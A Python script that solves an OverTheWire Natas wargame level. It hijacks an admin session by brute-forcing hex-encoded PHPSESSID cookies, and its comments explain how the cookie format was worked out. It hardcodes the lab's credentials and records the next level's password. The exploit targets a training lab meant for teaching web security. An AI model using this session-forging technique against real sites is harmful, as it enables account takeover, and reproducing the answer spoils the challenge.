import requests
import binascii

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = 'http://natas19.natas.labs.overthewire.org/'

#session = requests.session()

for i in range(1, 641):
  cook = binascii.b2a_hex(str("%d-admin"%i).encode('ascii')).decode('ascii') 
  req = requests.post(url, cookies={"PHPSESSID": cook} , auth = (username, password)) 
  if "are an admin" in req.text:
    print(req.text)
    break

# pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF



'''
for username "jack":
PHPSESSID=3631372d4a61636b
PHPSESSID=3931  2d4a61636b 
PHPSESSID=3530322d4a61636b

for username "123456":
	PHPSESSID=363137 2d3132333435
	PHPSESSID=363333 2d3132333435
	PHPSESSID=3938   2d3132333435 

check the cookies.
it has 2 parts, first varying part
and another fixed
This cookie is hex encoded
decoding, the first part is just some random number
and the second part is a hyphen "-" followed by the username

loop through "(1-641)-admin".encode('hex') as cookie
and get the password
'''